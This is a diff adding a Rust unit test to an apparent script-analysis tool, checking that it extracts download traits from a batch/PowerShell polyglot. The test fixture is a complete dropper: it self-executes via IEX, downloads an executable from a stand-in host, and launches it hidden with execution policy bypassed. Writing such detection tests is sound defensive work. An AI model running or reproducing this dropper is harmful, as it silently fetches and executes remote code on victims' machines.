@@ -1022,6 +1022,35 @@ if exist "%B64FILE%" del "%B64FILE%"
     }
 
     #[test]
+    fn direct_batch_powershell_polyglot_extracts_tail_downloads() {
+        let script = b"<# :batch\r\n\
+@echo off\r\n\
+powershell -Command \"IEX $([IO.File]::ReadAllText('%~f0'))\"\r\n\
+goto :eof\r\n\
+#>\r\n\
+$url1 = 'https://polyglot-command.example/qz.exe'\r\n\
+$filePath1 = [System.IO.Path]::Combine($env:USERPROFILE, 'qdll.exe')\r\n\
+$downloadCommand1 = \"Invoke-WebRequest -Uri '$url1' -OutFile '$filePath1'; Start-Process -FilePath '$filePath1'\"\r\n\
+Start-Process powershell -ArgumentList \"-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $downloadCommand1\" -WindowStyle Hidden\r\n";
+
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download {
+                    src,
+                    dst: Some(dst),
+                    ..
+                } if src == "https://polyglot-command.example/qz.exe"
+                    && dst == "C:\\Users\\puncher\\qdll.exe"
+            )),
+            "polyglot tail download not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ascii_case_insensitive_byte_gate_matches_script_tags() {
         assert!(crate::contains_ascii_case_insensitive_bytes(
             b"/* <SCRIPT language=\"JScript\"> */",
